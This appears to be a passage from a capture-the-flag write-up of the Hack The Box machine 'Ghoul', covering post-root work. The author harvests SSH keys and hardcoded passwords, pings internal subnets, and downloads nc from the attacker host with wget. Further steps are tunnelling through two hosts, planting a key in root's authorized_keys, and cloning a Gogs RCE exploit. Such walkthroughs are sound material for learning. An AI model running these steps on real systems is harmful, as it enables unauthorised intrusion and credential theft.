<code class="language-plaintext highlighter-rouge">Eto</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home/Eto# ls -al
total 40
drwx------ 1 Eto  Eto  4096 Dec 13  2018 .
drwxr-xr-x 1 root root 4096 Dec 13  2018 ..
lrwxrwxrwx 1 root root    9 Dec 29  2018 .bash_history -&gt; /dev/null
-rwx------ 1 Eto  Eto   220 Dec 13  2018 .bash_logout
-rwx------ 1 Eto  Eto  3771 Dec 13  2018 .bashrc
-rwx------ 1 Eto  Eto   807 Dec 13  2018 .profile
drwx------ 1 Eto  Eto  4096 Dec 13  2018 .ssh
-rwx------ 1 Eto  Eto    92 Dec 13  2018 alert.txt
root@Aogiri:/home/Eto# cat alert.txt 
Hey Noro be sure to keep checking the humans for IP logs and chase those little shits down!
root@Aogiri:/home/Eto# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">kaneki</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home/kaneki# ls -al
total 92
drwx------ 1 kaneki kaneki  4096 Dec 13  2018 .
drwxr-xr-x 1 root   root    4096 Dec 13  2018 ..
lrwxrwxrwx 1 root   root       9 Dec 29  2018 .bash_history -&gt; /dev/null
-rwx------ 1 kaneki kaneki   220 Dec 13  2018 .bash_logout
-rwx------ 1 kaneki kaneki  3771 Dec 13  2018 .bashrc
-rwx------ 1 kaneki kaneki   807 Dec 13  2018 .profile
drwx------ 1 kaneki kaneki  4096 Dec 13  2018 .ssh
-rw------- 1 kaneki kaneki  1802 Dec 13  2018 .viminfo
-rw------- 1 kaneki kaneki   148 Dec 13  2018 note.txt
-rwx------ 1 kaneki kaneki   136 Dec 13  2018 notes
-rwx------ 1 kaneki kaneki 39382 Dec 13  2018 secret.jpg
-rwx------ 1 kaneki kaneki    33 Dec 13  2018 user.txt
root@Aogiri:/home/kaneki# cat note.txt 
Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
root@Aogiri:/home/kaneki# cat notes
I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc.
DM me for the access.
root@Aogiri:/home/kaneki# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">noro</code> :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home# cd noro/
root@Aogiri:/home/noro# ls -al
total 40
drwx------ 1 noro noro 4096 Dec 13  2018 .
drwxr-xr-x 1 root root 4096 Dec 13  2018 ..
lrwxrwxrwx 1 root root    9 Dec 29  2018 .bash_history -&gt; /dev/null
-rwx------ 1 noro noro  220 Dec 13  2018 .bash_logout
-rwx------ 1 noro noro 3771 Dec 13  2018 .bashrc
-rwx------ 1 noro noro  807 Dec 13  2018 .profile
drwx------ 1 noro noro 4096 Dec 13  2018 .ssh
-rwx------ 1 noro noro   24 Dec 13  2018 to-do.txt
root@Aogiri:/home/noro# cat to-do.txt 
Need to update backups.
root@Aogiri:/home/noro# 
</code></pre></div></div>
<p>I could also get <code class="language-plaintext highlighter-rouge">ssh</code> info for the 3 users :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home/Eto/.ssh# ls -al
total 28
drwx------ 1 Eto Eto 4096 Dec 13  2018 .
drwx------ 1 Eto Eto 4096 Dec 13  2018 ..
-rwx------ 1 Eto Eto  392 Dec 13  2018 authorized_keys
-rwx------ 1 Eto Eto 1675 Dec 13  2018 id_rsa
-rwx------ 1 Eto Eto  392 Dec 13  2018 id_rsa.pub
root@Aogiri:/home/Eto/.ssh# cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzKoGE8Z9QDJDlC52zJFtQHHvZGxXgLi8fnYCOCi6GvuDV+ZNt3krFCwbkn02HAExvj1J9GXkPbZGNwMlYOYNZPqVOT7RRJML9yQNKxl4FW2IX4R23DPN17i/vjF4Gyjkk05H+P4QXsk34KZ71SOT+KMGTJ2tpV+VUKAl6jlMJM5ahDAPgrA6k2DOLk+oRF4c7Riwc2xz3/PNI/EJR8MMK5tP8bp6NUPt2AtCLO495dBFeGX6I164G5csjxxJKx5mzgjJsv5BL0l4H0RvLobDoXF++Lm3r580R6dVFsSlkC7TLJ8oscreVs6cfanQwc0E7zs61dipl5q9ceW1XWK/J Eto@Aogiri                              
root@Aogiri:/home/Eto/.ssh# cd ../../kaneki/.ssh/
root@Aogiri:/home/kaneki/.ssh# ls -la
total 28
drwx------ 1 kaneki kaneki 4096 Dec 13  2018 .
drwx------ 1 kaneki kaneki 4096 Dec 13  2018 ..
-rwx------ 1 kaneki kaneki  797 Dec 13  2018 authorized_keys
-rwx------ 1 kaneki kaneki 1766 Dec 13  2018 id_rsa
-rwx------ 1 kaneki kaneki  395 Dec 13  2018 id_rsa.pub
root@Aogiri:/home/kaneki/.ssh# cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl kaneki_pub@kaneki-pc                    
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri                           
root@Aogiri:/home/kaneki/.ssh# cd ../../noro/.ssh/
root@Aogiri:/home/noro/.ssh# ls -al
total 28
drwx------ 1 noro noro 4096 Dec 13  2018 .
drwx------ 1 noro noro 4096 Dec 13  2018 ..
-rwx------ 1 noro noro  393 Dec 13  2018 authorized_keys
-rwx------ 1 noro noro 1675 Dec 13  2018 id_rsa
-rwx------ 1 noro noro  393 Dec 13  2018 id_rsa.pub
root@Aogiri:/home/noro/.ssh# cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAIchqQ1i+uOQ4jckHbO8sdtks3Cm6Ygie9youcFvqH6rBSxqWdQn8PdQ/HgrXN+RvED28aRC0kkzACL79gx9RGS4/kxqZBlPyP9mu7BWmC1J0NLACws0mvinztpixUaNj2w4WaBBe2+MpfeRoo9Abk4sBcZC7De6ZZl6RRqrdsb1kTZSWMXyxIOJMZrc+3dAc5+faujSkyeVbudjSlLf3g8xis/uSE3OvGhF4ypYDGDSRYbLY8oScDNU0eQexGMXYcY10z5f69hnrvaZ8wkvTKXwqHoMpgtjBz5NxewnY6UqhdMn0LkEeZdtK6UPRHdfSwoxjOgSyjaEmhU013d+p noro@Aogiri
root@Aogiri:/home/noro/.ssh# 
</code></pre></div></div>
<p>In <code class="language-plaintext highlighter-rouge">kaneki</code>’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> there was a public key for <code class="language-plaintext highlighter-rouge">kaneki_pub@kaneki-pc</code>, with that and the hints about <code class="language-plaintext highlighter-rouge">kaneki</code>’s pc and the other file server it was obvious that we need to pivot to another host. But before that I could find some passwords in <code class="language-plaintext highlighter-rouge">/var/www/html/users/login.php</code> :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="cm">/* Starts the session */</span>
        <span class="cm">/* Check Login form submitted */</span>
        <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Submit'</span><span class="p">])){</span>
                <span class="cm">/* Define username and associated password array */</span>
                <span class="nv">$logins</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'kaneki'</span> <span class="o">=&gt;</span> <span class="s1">'123456'</span><span class="p">,</span><span class="s1">'noro'</span> <span class="o">=&gt;</span> <span class="s1">'password123'</span><span class="p">,</span><span class="s1">'admin'</span> <span class="o">=&gt;</span> <span class="s1">'abcdef'</span><span class="p">);</span>

                <span class="cm">/* Check and assign submitted Username and Password to new variable */</span>                                                   
                <span class="nv">$Username</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Username'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>
                <span class="nv">$Password</span> <span class="o">=</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Password'</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'Password'</span><span class="p">]</span> <span class="o">:</span> <span class="s1">''</span><span class="p">;</span>

                <span class="cm">/* Check Username and Password existence in defined array */</span>
                <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$logins</span><span class="p">[</span><span class="nv">$Username</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$logins</span><span class="p">[</span><span class="nv">$Username</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$Password</span><span class="p">){</span>
                        <span class="cm">/* Success: Set session variables and redirect to Protected page  */</span>
                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'UserData'</span><span class="p">][</span><span class="s1">'Username'</span><span class="p">]</span><span class="o">=</span><span class="nv">$logins</span><span class="p">[</span><span class="nv">$Username</span><span class="p">];</span>
                        <span class="nb">header</span><span class="p">(</span><span class="s2">"location:index.php"</span><span class="p">);</span>
                        <span class="k">exit</span><span class="p">;</span>
                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                        <span class="cm">/*Unsuccessful attempt: Set error message */</span>
                        <span class="nv">$msg</span><span class="o">=</span><span class="s2">"&lt;span style='color:red'&gt;Invalid Login Details&lt;/span&gt;"</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>And in <code class="language-plaintext highlighter-rouge">/usr/share/tomcat7/conf/tomcat-users.xml</code> :</p>
<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span>
<span class="c">&lt;!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
--&gt;</span>
<span class="nt">&lt;tomcat-users&gt;</span>
<span class="c">&lt;!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
--&gt;</span>
<span class="c">&lt;!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds
  them. You will also need to set the passwords to something appropriate.
--&gt;</span>
<span class="c">&lt;!--
  &lt;role rolename="tomcat"/&gt;
  &lt;role rolename="role1"/&gt;
  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;
  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;
  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;
--&gt;</span>

  <span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">"admin"</span> <span class="na">password=</span><span class="s">"admin"</span> <span class="na">roles=</span><span class="s">"admin"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;role</span> <span class="na">rolename=</span><span class="s">"admin"</span> <span class="nt">/&gt;</span>
  <span class="c">&lt;!--&lt;user username="admin" password="test@aogiri123" roles="admin" /&gt;
  &lt;role rolename="admin" /&gt;--&gt;</span>
<span class="nt">&lt;/tomcat-users&gt;</span> 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">123456</code>, <code class="language-plaintext highlighter-rouge">password123</code> and <code class="language-plaintext highlighter-rouge">test@aogiri123</code>. Maybe we’ll need them later.<br>
I checked the other interfaces :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home/noro# ifconfig 
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)
        RX packets 54427  bytes 10267568 (10.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 49877  bytes 43322005 (43.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 467  bytes 46415 (46.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 467  bytes 46415 (46.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@Aogiri:/home/noro# 
</code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">Aogiri</code>’s ip on <code class="language-plaintext highlighter-rouge">eth0</code> is <code class="language-plaintext highlighter-rouge">172.20.0.10</code>. We need to know what other hosts are live on that subnet so we will do a simple <a href="https://en.wikipedia.org/wiki/Ping_sweep" target="_blank" rel="noopener noreferrer">ping sweep</a> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:~# for i in {1..255}; do ping -c 1 172.20.0.$i; done | grep 'ttl='
64 bytes from 172.20.0.1: icmp_seq=0 ttl=64 time=0.109 ms
64 bytes from 172.20.0.10: icmp_seq=0 ttl=64 time=0.066 ms
64 bytes from 172.20.0.150: icmp_seq=0 ttl=64 time=0.272 ms
root@Aogiri:~# 
</code></pre></div></div>
<p>We got <code class="language-plaintext highlighter-rouge">172.20.0.150</code> we need to scan it for open ports, neither <code class="language-plaintext highlighter-rouge">nmap</code> nor <code class="language-plaintext highlighter-rouge">nc</code> was installed so I got a <a href="https://github.com/yunchih/static-binaries/blob/master/nc" target="_blank" rel="noopener noreferrer">static version</a> of <code class="language-plaintext highlighter-rouge">nc</code> and uploaded it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/tmp# wget http://10.10.xx.xx/nc
--2019-10-04 13:05:16--  http://10.10.xx.xx/nc
Connecting to 10.10.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 959800 (937K) [application/octet-stream]
Saving to: ‘nc’
nc                                                   100%[=====================================================================================================================&gt;] 937.30K   242KB/s    in 5.3s
2019-10-04 13:05:22 (177 KB/s) - ‘nc’ saved [959800/959800]
root@Aogiri:/tmp# 
</code></pre></div></div>
<p>I scanned the first 1000 ports and <code class="language-plaintext highlighter-rouge">ssh</code> was open :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/tmp# ./nc -zv 172.20.0.150 1-1000
64978af526b2.Aogiri [172.20.0.150] 22 (ssh) open
root@Aogiri:/tmp# 
</code></pre></div></div>
<p>Assuming that <code class="language-plaintext highlighter-rouge">172.20.0.150</code> is <code class="language-plaintext highlighter-rouge">kaneki-pc</code> we can use <code class="language-plaintext highlighter-rouge">kaneki</code>’s private key to ssh as <code class="language-plaintext highlighter-rouge">kaneki_pub</code>. But there was a problem, the key is encrypted :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491F

wqcYgOwX3V511WRuXWuRheYyzo5DelW+/XsBtXoL8/Ow7/Tj4EC4dKCfas39HQW8
MNbTv51gYxQ/Vc3W1jEYSyxTCYAu600naUhX3+En7P8kje2s0I4VEZX0MJqgB/pv
J9nPBtbXcqV6/v6Vkbc5kGtMiRVMYzS9KWiCOafveFQCr1orYmnNINsZou4AWrfB
Ofr63sUVD8V1Rabnoltbo+pePXnQ6HqjpO1b2qCyUQBxDxwSFT5a+j5YvMYV3JXK
HOo4D0fcMoBVT46pXga6wZtiB4XgeM/iB/xg6YfdfMPuDBJ6+fqZMjlm+GvEexkl
EEtJAqoSG/yCOjedByVqmfKye9DaIY9Um2WkWcX1bVRlYktYtpb755aDmVVoQjb5
CmW4yuLapjqUrGEFY+ghLLRdZvSBPZ18PbUgVMqpdmrfnEy48d22IGPJ6ZO2L4qR
FzLjkQkjFRgkrBJ9bSzYS/NYZ8QGQh/wk3BHaupjLxD2j1Ta7PXwCjh4zBZNPO/e
9VN9c+b/zwYSyyeKcJ8dhFEH26j5g93EnWTkdLEMyw6tRbdzhQbNo02WWDTvWPJv
+6A+6xA6/+NxacHXfyfxQ+l8CsmpZ5CgKjKHfFeDYZHyoPhcthKkL3Go3rqZ1HOb
MimhTR3wOUwoV/XaVcCvW+5LwPh1ljdnHCjaY2VzKns4/X+2dZtOsDz5aCovN7mM
eHsRuIEVKtZ2EijKfYZGtDaDwTd/1YTDooGdDDdDipr8bTDvD14r07Yk/xrfjEUp
V9+v3PzmD1trqIlFw+7D8ogFsXJ/P+raVFWaihQWEeqOnGXEhHQ0afgcVt9w62tV
1YeVA0RwHu4S1IObji9RP1DfAMid0pCSnvAoFd/EArnAtwgPFOLqvPZj5j+LjFPL
sOHUW+N+cY24HpH1UVTEWAkgkiGz89/bF98c1kpoLEkS2sjU+jVONTBlLeRmqcDJ
YnCcPXrkT6oC/wctYlM141hrctWRyjY+f0IwREDCv8TM1aAAY3vaZUdMfy71Q3DE
PO4S5ivuruwGeCQmGhEmWBSm0PwpGd0pNbHv+zs0TH+2lmAn8O3R2UrcCu0TxhmH
oW0mQbl+2u+xVB5ijjqtm0CFLsXiX17FdCbMp1huCMTx9TuY6GMeSsN6X7exTIcx
DEvpUHREXgtVqBdNX1QxIoMIxpK2qlMfPYtGikthba5fjBof0b/8lJvtZuoWrJ9R
L0HWW16fkbjEXSrwdEb5zjntCxJKLWmKgiFfaoJ9/L1yhc12w/EQjpUxGkFdyeMs
7QyGClGpKFU4GQvKMQYei57sNk/ZUPgPWizNfuuU/8qBhKXG9JB2R3GWFTEpxzO8
luTnBEUn8Se3cLNrBQ05LIVk2jRYhUE6IBWFYvhjQUGChZTZjSlxNR55t6olYj2M
JBxtT5E2YDhSk4nB21IlTIurggP9pNm+PtTTt2o0jzOD5uOHko6VzGz4Ukvbo0gZ
/zyr4fR7OhGG0grtKxV1s2PpDt9bkhnMXJ+I8zZVN9INHUsoE5IXtpKKJOCQYFjQ
v+EB7xAmWe1q9xSgLSq6I1fWJrYqjkOd9TpqVPNoyTGWM1ELYXyHah8vZi+0BFzh
-----END RSA PRIVATE KEY-----
</code></pre></div></div>
<p>I tried to crack the key but I couldn’t find the password in <code class="language-plaintext highlighter-rouge">rockyou</code>. Then I remembered <code class="language-plaintext highlighter-rouge">/secret.php</code> when <code class="language-plaintext highlighter-rouge">Noro</code> asked <code class="language-plaintext highlighter-rouge">Kaneki</code> for access and <code class="language-plaintext highlighter-rouge">Kaneki</code> replied with a weird string that looked like a password (<code class="language-plaintext highlighter-rouge">ILoveTouka</code>) :
<br><img src="/images/hackthebox/ghoul/2.png" alt="" class="align-center"><br><br>
I tried that as the key password and it worked :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# nano kaneki.key
root@kali:~/Desktop/HTB/boxes/ghoul# chmod 600 kaneki.key 
root@kali:~/Desktop/HTB/boxes/ghoul# ssh -i kaneki.key kaneki@ghoul.htb 
Enter passphrase for key 'kaneki.key': 
Last login: Fri Oct  4 11:40:26 2019 from 10.10.15.168
kaneki@Aogiri:~$ 
</code></pre></div></div>
<p>Since I’m going to tunnel stuff I echoed my public key to <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> and I got ssh as root :
<br><img src="/images/hackthebox/ghoul/18.png" alt="" class="align-center"><br><br>
I forwarded port 22 on <code class="language-plaintext highlighter-rouge">172.20.0.150</code> then I sshed to the box as <code class="language-plaintext highlighter-rouge">kaneki_pub</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# ssh -i id_rsa -L 2020:172.20.0.150:22 root@ghoul.htb 
Last login: Fri Oct  4 13:13:00 2019 from 10.10.xx.xx
root@Aogiri:~# 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# ssh kaneki_pub@localhost -p 2020 -i ./kaneki.key 
Enter passphrase for key './kaneki.key': 
Last login: Fri Oct  4 11:35:41 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$
</code></pre></div></div>

<h2 id="rce-in-gogs-pivoting-from-kaneki-pc-to-git">RCE in gogs, Pivoting from kaneki-pc to git</h2>
<p>There was a text file called <code class="language-plaintext highlighter-rouge">to-do.txt</code> in the home directory :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ ls -la
total 40
drwx------ 3 kaneki_pub kaneki_pub 4096 Dec 16  2018 .
drwxr-xr-x 1 root       root       4096 Dec 16  2018 ..
lrwxrwxrwx 1 root       root          9 Dec 29  2018 .bash_history -&gt; /dev/null
-rwx------ 1 kaneki_pub kaneki_pub  220 Dec 16  2018 .bash_logout
-rwx------ 1 kaneki_pub kaneki_pub 3771 Dec 16  2018 .bashrc
-rwx------ 1 kaneki_pub kaneki_pub  807 Dec 16  2018 .profile
drwx------ 2 kaneki_pub kaneki_pub 4096 Dec 16  2018 .ssh
-rw------- 1 kaneki_pub kaneki_pub 3139 Dec 16  2018 .viminfo
-rw-r--r-- 1 kaneki_pub kaneki_pub  165 Dec 16  2018 .wget-hsts
-rw-r--r-- 1 root       root         44 Dec 16  2018 to-do.txt
kaneki_pub@kaneki-pc:~$ cat to-do.txt 
Give AogiriTest user access to Eto for git.
kaneki_pub@kaneki-pc:~$ 
</code></pre></div></div>
<p>On <code class="language-plaintext highlighter-rouge">Aogiri</code> there was a hint about a vulnerability in <code class="language-plaintext highlighter-rouge">gogs</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:/home/kaneki# cat note.txt 
Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.
</code></pre></div></div>

<blockquote>
  <p>A painless self-hosted Git service. -<a href="https://gogs.io/" target="_blank" rel="noopener noreferrer">gogs.io</a></p>
</blockquote>

<p>I checked the interfaces and there was a new subnet :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ ifconfig 
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:ac:14:00:96  txqueuelen 0  (Ethernet)
        RX packets 8644  bytes 924940 (924.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5908  bytes 2135441 (2.1 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255
        ether 02:42:ac:12:00:c8  txqueuelen 0  (Ethernet)
        RX packets 1650  bytes 2723948 (2.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1684  bytes 352910 (352.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25  bytes 1661 (1.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25  bytes 1661 (1.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

kaneki_pub@kaneki-pc:~$ 
</code></pre></div></div>
<p>So I ran another ping sweep :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:~$ for i in {1..255}; do ping -c 1 172.18.0.$i; done | grep 'ttl='
64 bytes from 172.18.0.1: icmp_seq=0 ttl=64 time=0.125 ms
64 bytes from 172.18.0.2: icmp_seq=0 ttl=64 time=0.146 ms
64 bytes from 172.18.0.200: icmp_seq=0 ttl=64 time=0.054 ms
</code></pre></div></div>
<p>And again I downloaded <code class="language-plaintext highlighter-rouge">nc</code> to scan the discovered host (<code class="language-plaintext highlighter-rouge">172.18.0.200</code>) :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:/tmp$ wget http://172.20.0.10:8888/nc
--2019-10-04 13:37:59--  http://172.20.0.10:8888/nc
Connecting to 172.20.0.10:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 959800 (937K) [application/octet-stream]
Saving to: ‘nc’
nc                                                   100%[=====================================================================================================================&gt;] 937.30K  --.-KB/s    in 0.006s 
2019-10-04 13:37:59 (161 MB/s) - ‘nc’ saved [959800/959800]
kaneki_pub@kaneki-pc:/tmp$
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaneki_pub@kaneki-pc:/tmp$ ./nc -zv 172.18.0.2 1-10000
cuff_web_1.cuff_default [172.18.0.2] 22 (ssh) open
cuff_web_1.cuff_default [172.18.0.2] 3000 open
kaneki_pub@kaneki-pc:/tmp$ 
</code></pre></div></div>
<p>Port 3000 is the default port for <code class="language-plaintext highlighter-rouge">gogs</code>, I forwarded it to <code class="language-plaintext highlighter-rouge">Aogori</code> then from <code class="language-plaintext highlighter-rouge">Aogiri</code> to my machine :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Aogiri:~# ssh -L 3000:172.18.0.2:3000 -i /home/kaneki/.ssh/id_rsa kaneki_pub@172.20.0.150                                                                                                                     
Enter passphrase for key '/home/kaneki/.ssh/id_rsa': 
Last login: Fri Oct  4 13:38:45 2019 from 172.20.0.10
kaneki_pub@kaneki-pc:~$ 
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# ssh -L 3000:127.0.0.1:3000 -i kaneki.key kaneki@ghoul.htb 
Enter passphrase for key 'kaneki.key': 
Last login: Fri Oct  4 13:42:14 2019 from 10.10.15.168
kaneki@Aogiri:~$ 
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ghoul/19.png" alt="" class="align-center"><br><br>
We already have the username : <code class="language-plaintext highlighter-rouge">AogiriTest</code>. I tried the password I got from <code class="language-plaintext highlighter-rouge">tomcat-users.xml</code> (<code class="language-plaintext highlighter-rouge">test@aogiri123</code>) and it worked :
<br><img src="/images/hackthebox/ghoul/20.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/ghoul/21.png" alt="" class="align-center"><br><br>
The hint said that this version of <code class="language-plaintext highlighter-rouge">gogs</code> was vulnerable, so I cloned <a href="https://github.com/TheZ3ro/gogsownz" target="_blank" rel="noopener noreferrer">gogsownz</a> and tried to exploit the <code class="language-plaintext highlighter-rouge">RCE</code> vulnerability :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ghoul# git clone https://github.com/TheZ3ro/gogsownz.git
Cloning into 'gogsownz'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 11 (delta 2), reused 5 (delta 0), pack-reused 0
Unpacking objects: 100% (11/11), done.
root@kali:~/Desktop/HTB/boxes/ghoul# 
</code></pre></div></div>

